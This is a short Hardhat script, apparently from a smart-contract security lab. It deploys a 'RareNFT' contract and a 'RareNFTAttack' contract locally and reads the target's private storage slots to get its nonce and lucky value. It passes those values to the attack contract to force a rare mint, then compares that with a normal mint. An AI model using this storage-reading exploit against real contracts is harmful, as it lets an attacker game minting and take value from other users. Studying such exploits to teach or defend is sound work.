const { ethers } = require("hardhat");

const ONE_ETHER = ethers.utils.parseUnits("1", "ether");

async function deploy(deployer, attacker) {
    const Rare = await ethers.getContractFactory("RareNFT", deployer);
    const RareNFTAttack = await ethers.getContractFactory("RareNFTAttack", attacker);

    const rare = await Rare.deploy({value:ONE_ETHER});
    const attack = await RareNFTAttack.deploy({value:ONE_ETHER});

    return [rare,attack];
}

async function main() {
    let [deployer, attacker] = await ethers.getSigners();
    let [rare,attack] = await deploy(deployer, attacker);
    console.log("RareNFT contract :", rare.address);
    console.log("Attack contract :", attack.address);

    let nonce=await ethers.provider.getStorageAt(rare.address,3);
    let luckyVal=await ethers.provider.getStorageAt(rare.address,4);

    await attack.connect(attacker).attack(nonce,luckyVal);
    rare.tokenInfo(0).then(res =>
        console.log("Attack mint:\n",res));


    await rare.connect(attacker).mint(1,{value:ONE_ETHER});
    rare.tokenInfo(1).then(res =>
        console.log("Normal mint:\n",res));



}

main();
